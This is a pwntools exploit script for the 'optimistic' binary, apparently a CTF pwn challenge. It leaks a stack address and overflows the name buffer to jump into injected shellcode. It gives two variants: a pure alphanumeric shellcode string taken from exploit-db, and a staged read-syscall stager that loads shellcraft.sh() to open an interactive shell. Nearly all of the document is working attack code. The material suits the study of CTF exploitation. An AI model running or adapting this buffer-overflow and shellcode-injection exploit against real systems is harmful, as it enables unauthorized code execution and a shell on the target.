#!/usr/bin/env python3

from pwn import *

e = ELF("./optimistic_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main+184)
                      b *(main+236)
                      b *(main+424)
                      b *(main+481)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def alphanumeric_approach():
    r = conn()

    # Pure alphanumeric shellcode

    r.sendlineafter(b'(y/n):', b'y')
    data = r.recvline().split()[-1]
    rbp = int(data, 16)
    email_buff_addr = rbp - 0x60
    info(f'The email_buff_addr is at {hex(email_buff_addr)}')
    # We should not use sendlineafter here otherwise we will get an extra newline byte.
    r.sendafter(b'Email:', b'e')
    r.sendafter(b'Age:', b'1')
    r.sendlineafter(b'name:', b'-1')

    # Pure alphanumeric shellcode from https://www.exploit-db.com/exploits/35205
    shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
    payload = flat(
            shellcode,
            b'A' * (104 - len(shellcode)),
            email_buff_addr,
            )
    r.sendlineafter(b'Name:', payload)

    r.interactive()

def staged_approach():
    r = conn()

    # Staged payloads

    # Due to the character checks in the code, we can only overwrite the last 8 bytes to anything. (Not including the newline.)

    r.sendlineafter(b'(y/n):', b'y')
    data = r.recvline().split()[-1]
    rbp = int(data, 16)
    email_buff_addr = rbp - 0x70
    info(f'The email_buff_addr is at {hex(email_buff_addr)}')
    stager = asm('''
    xor eax, eax
    xor edi, edi
    mov rsi, rsp
    mov edx, 0x100
    syscall
    jmp rsp
''')
    info(f'stager has length {len(stager)}')  # Happen to have 16 bytes
    # We should not use sendlineafter here otherwise we will get an extra newline byte.
    r.sendafter(b'Email:', stager[:8])
    r.sendafter(b'Age:', stager[8:])
    r.sendlineafter(b'name:', b'-1')

    payload = flat(
            b'A' * 104,
            email_buff_addr,
            )
    r.sendlineafter(b'Name:', payload)
    r.sendline(asm(shellcraft.sh()))

    r.interactive()

if __name__ == "__main__":
    staged_approach()
